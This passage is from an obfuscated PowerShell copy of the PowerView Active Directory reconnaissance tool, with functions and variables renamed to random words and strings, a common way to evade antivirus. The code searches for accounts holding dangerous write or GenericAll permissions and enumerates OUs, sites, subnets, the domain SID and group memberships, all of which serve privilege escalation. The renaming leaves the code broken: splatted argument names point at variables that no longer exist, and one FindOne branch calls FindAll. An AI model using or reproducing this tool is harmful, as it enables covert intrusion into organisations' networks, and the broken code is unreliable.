        [Switch]
        $NqHBpnUT99,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $AxlkOdCi99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $QYytNtzC99 = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $QYytNtzC99['ResolveGUIDs'] = $NqHBpnUT99 }
        if ($PSBoundParameters['RightsFilter']) { $QYytNtzC99['RightsFilter'] = $AxlkOdCi99 }
        if ($PSBoundParameters['LDAPFilter']) { $QYytNtzC99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['SearchBase']) { $QYytNtzC99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $QYytNtzC99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $QYytNtzC99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $QYytNtzC99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $QYytNtzC99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $QYytNtzC99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $QYytNtzC99['Credential'] = $xjRyyQze99 }
        $jhaZyveK99 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $jhaZyveK99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $jhaZyveK99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $jhaZyveK99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $jhaZyveK99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $jhaZyveK99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $jhaZyveK99['Credential'] = $xjRyyQze99 }
        $OSvdjCmE99 = @{}
        if ($PSBoundParameters['Server']) { $OSvdjCmE99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['Credential']) { $OSvdjCmE99['Credential'] = $xjRyyQze99 }
        $vgMYaqxB99 = @{}
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $QYytNtzC99['Domain'] = $gddrYpaX99
            $OSvdjCmE99['Domain'] = $gddrYpaX99
        }
        striking @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($vgMYaqxB99[$_.SecurityIdentifier.Value]) {
                        $YcRvnZST99, $NxFCxVOE99, $bOdSpOdf99, $ShHAOWBo99 = $vgMYaqxB99[$_.SecurityIdentifier.Value]
                        $ddiHkzqC99 = New-Object PSObject
                        $ddiHkzqC99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $ddiHkzqC99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $ddiHkzqC99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $ddiHkzqC99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $ddiHkzqC99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $ddiHkzqC99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $ddiHkzqC99 | Add-Member NoteProperty 'AceType' $_.AceType
                        $ddiHkzqC99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $ddiHkzqC99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $ddiHkzqC99 | Add-Member NoteProperty 'IdentityReferenceName' $YcRvnZST99
                        $ddiHkzqC99 | Add-Member NoteProperty 'IdentityReferenceDomain' $NxFCxVOE99
                        $ddiHkzqC99 | Add-Member NoteProperty 'IdentityReferenceDN' $bOdSpOdf99
                        $ddiHkzqC99 | Add-Member NoteProperty 'IdentityReferenceClass' $ShHAOWBo99
                        $ddiHkzqC99
                    }
                    else {
                        $bOdSpOdf99 = macrocosms -phaEiMpW99 $_.SecurityIdentifier.Value -xilKAxpM99 DN @ADNameArguments
                        if ($bOdSpOdf99) {
                            $NxFCxVOE99 = $bOdSpOdf99.SubString($bOdSpOdf99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            $jhaZyveK99['Domain'] = $NxFCxVOE99
                            $jhaZyveK99['Identity'] = $bOdSpOdf99
                            $Object = scram @ObjectSearcherArguments
                            if ($Object) {
                                $YcRvnZST99 = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $ShHAOWBo99 = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $ShHAOWBo99 = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $ShHAOWBo99 = 'user'
                                }
                                else {
                                    $ShHAOWBo99 = $Null
                                }
                                $vgMYaqxB99[$_.SecurityIdentifier.Value] = $YcRvnZST99, $NxFCxVOE99, $bOdSpOdf99, $ShHAOWBo99
                                $ddiHkzqC99 = New-Object PSObject
                                $ddiHkzqC99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $ddiHkzqC99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $ddiHkzqC99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $ddiHkzqC99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $ddiHkzqC99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $ddiHkzqC99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $ddiHkzqC99 | Add-Member NoteProperty 'AceType' $_.AceType
                                $ddiHkzqC99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $ddiHkzqC99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $ddiHkzqC99 | Add-Member NoteProperty 'IdentityReferenceName' $YcRvnZST99
                                $ddiHkzqC99 | Add-Member NoteProperty 'IdentityReferenceDomain' $NxFCxVOE99
                                $ddiHkzqC99 | Add-Member NoteProperty 'IdentityReferenceDN' $bOdSpOdf99
                                $ddiHkzqC99 | Add-Member NoteProperty 'IdentityReferenceClass' $ShHAOWBo99
                                $ddiHkzqC99
                            }
                        }
                        else {
                            Write-Warning "[migrated] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with macrocosms"
                        }
                    }
                }
            }
        }
    }
}
function alleluias {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $wBMxOopZ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $xykLhbxa99 = indenturing @SearcherArguments
    }
    PROCESS {
        if ($xykLhbxa99) {
            $hAflFVrb99 = ''
            $tGcqvLrx99 = ''
            $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($SvGoFRkz99 -match '^OU=.*') {
                    $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[alleluias] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                        $VrICpjXS99['Domain'] = $chKaCwXV99
                        $xykLhbxa99 = indenturing @SearcherArguments
                        if (-not $xykLhbxa99) {
                            Write-Warning "[alleluias] Unable to retrieve domain searcher for '$chKaCwXV99'"
                        }
                    }
                }
                else {
                    try {
                        $PFeUtWYw99 = (-Join (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                    }
                    catch {
                        $hAflFVrb99 += "(name=$SvGoFRkz99)"
                    }
                }
            }
            if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                $tGcqvLrx99 += "(|$hAflFVrb99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[alleluias] Searching for OUs with $wBMxOopZ99 set in the gpLink property"
                $tGcqvLrx99 += "(gplink=*$wBMxOopZ99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[alleluias] Using additional LDAP filter: $vqxjYeAS99"
                $tGcqvLrx99 += "$vqxjYeAS99"
            }
            $xykLhbxa99.filter = "(&(objectCategory=organizationalUnit)$tGcqvLrx99)"
            Write-Verbose "[alleluias] alleluias filter string: $($xykLhbxa99.filter)"
            if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $xykLhbxa99.FindOne() }
            else { $jAOXTyAF99 = $xykLhbxa99.FindAll() }
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $OU = $_
                }
                else {
                    $OU = favorites -PjvsRTzX99 $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[alleluias] Error disposing of the Results object: $_"
                }
            }
            $xykLhbxa99.dispose()
        }
    }
}
function cooky {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $wBMxOopZ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $VrICpjXS99 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $zMkNJVAV99 = indenturing @SearcherArguments
    }
    PROCESS {
        if ($zMkNJVAV99) {
            $hAflFVrb99 = ''
            $tGcqvLrx99 = ''
            $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($SvGoFRkz99 -match '^CN=.*') {
                    $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[cooky] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                        $VrICpjXS99['Domain'] = $chKaCwXV99
                        $zMkNJVAV99 = indenturing @SearcherArguments
                        if (-not $zMkNJVAV99) {
                            Write-Warning "[cooky] Unable to retrieve domain searcher for '$chKaCwXV99'"
                        }
                    }
                }
                else {
                    try {
                        $PFeUtWYw99 = (-Join (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                    }
                    catch {
                        $hAflFVrb99 += "(name=$SvGoFRkz99)"
                    }
                }
            }
            if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                $tGcqvLrx99 += "(|$hAflFVrb99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[cooky] Searching for sites with $wBMxOopZ99 set in the gpLink property"
                $tGcqvLrx99 += "(gplink=*$wBMxOopZ99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[cooky] Using additional LDAP filter: $vqxjYeAS99"
                $tGcqvLrx99 += "$vqxjYeAS99"
            }
            $zMkNJVAV99.filter = "(&(objectCategory=site)$tGcqvLrx99)"
            Write-Verbose "[cooky] cooky filter string: $($zMkNJVAV99.filter)"
            if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $zMkNJVAV99.FindAll() }
            else { $jAOXTyAF99 = $zMkNJVAV99.FindAll() }
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Site = $_
                }
                else {
                    $Site = favorites -PjvsRTzX99 $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[cooky] Error disposing of the Results object"
                }
            }
            $zMkNJVAV99.dispose()
        }
    }
}
function augmentation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ixDINSpI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $VrICpjXS99 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $eZwYqxqQ99 = indenturing @SearcherArguments
    }
    PROCESS {
        if ($eZwYqxqQ99) {
            $hAflFVrb99 = ''
            $tGcqvLrx99 = ''
            $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($SvGoFRkz99 -match '^CN=.*') {
                    $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[augmentation] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                        $VrICpjXS99['Domain'] = $chKaCwXV99
                        $eZwYqxqQ99 = indenturing @SearcherArguments
                        if (-not $eZwYqxqQ99) {
                            Write-Warning "[augmentation] Unable to retrieve domain searcher for '$chKaCwXV99'"
                        }
                    }
                }
                else {
                    try {
                        $PFeUtWYw99 = (-Join (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                    }
                    catch {
                        $hAflFVrb99 += "(name=$SvGoFRkz99)"
                    }
                }
            }
            if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                $tGcqvLrx99 += "(|$hAflFVrb99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[augmentation] Using additional LDAP filter: $vqxjYeAS99"
                $tGcqvLrx99 += "$vqxjYeAS99"
            }
            $eZwYqxqQ99.filter = "(&(objectCategory=subnet)$tGcqvLrx99)"
            Write-Verbose "[augmentation] augmentation filter string: $($eZwYqxqQ99.filter)"
            if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $eZwYqxqQ99.FindOne() }
            else { $jAOXTyAF99 = $eZwYqxqQ99.FindAll() }
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $odQWtpaO99 = $_
                }
                else {
                    $odQWtpaO99 = favorites -PjvsRTzX99 $_.Properties
                }
                $odQWtpaO99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
                if ($PSBoundParameters['SiteName']) {
                    if ($odQWtpaO99.properties -and ($odQWtpaO99.properties.siteobject -like "*$ixDINSpI99*")) {
                        $odQWtpaO99
                    }
                    elseif ($odQWtpaO99.siteobject -like "*$ixDINSpI99*") {
                        $odQWtpaO99
                    }
                }
                else {
                    $odQWtpaO99
                }
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[augmentation] Error disposing of the Results object: $_"
                }
            }
            $eZwYqxqQ99.dispose()
        }
    }
}
function hominess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    $VrICpjXS99 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
    if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
    if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
    $DCSID = pickerels @SearcherArguments -DiGVDgqd99 | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[hominess] Error extracting domain SID for '$gddrYpaX99'"
    }
}
function floors {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $uEvGMWlH99,
        [Switch]
        $hhjHMdFg99,
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $snrhmglp99,
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $NjfPJVcO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $IhrLlPlN99 = indenturing @SearcherArguments
    }
    PROCESS {
        if ($IhrLlPlN99) {
            if ($PSBoundParameters['MemberIdentity']) {
                if ($VrICpjXS99['Properties']) {
                    $gIZECdbV99 = $VrICpjXS99['Properties']
                }
                $VrICpjXS99['Identity'] = $uEvGMWlH99
                $VrICpjXS99['Raw'] = $True
                scram @SearcherArguments | ForEach-Object {
                    $OYQDBPWk99 = $_.GetDirectoryEntry()
                    $OYQDBPWk99.RefreshCache('tokenGroups')
                    $OYQDBPWk99.TokenGroups | ForEach-Object {
                        $CAsXSzun99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if ($CAsXSzun99 -notmatch '^S-1-5-32-.*') {
                            $VrICpjXS99['Identity'] = $CAsXSzun99
                            $VrICpjXS99['Raw'] = $False
                            if ($gIZECdbV99) { $VrICpjXS99['Properties'] = $gIZECdbV99 }
                            $Group = scram @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $hAflFVrb99 = ''
                $tGcqvLrx99 = ''
                $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                    $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($SvGoFRkz99 -match '^S-1-') {
                        $hAflFVrb99 += "(objectsid=$SvGoFRkz99)"
                    }
                    elseif ($SvGoFRkz99 -match '^CN=') {
                        $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[floors] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                            $VrICpjXS99['Domain'] = $chKaCwXV99
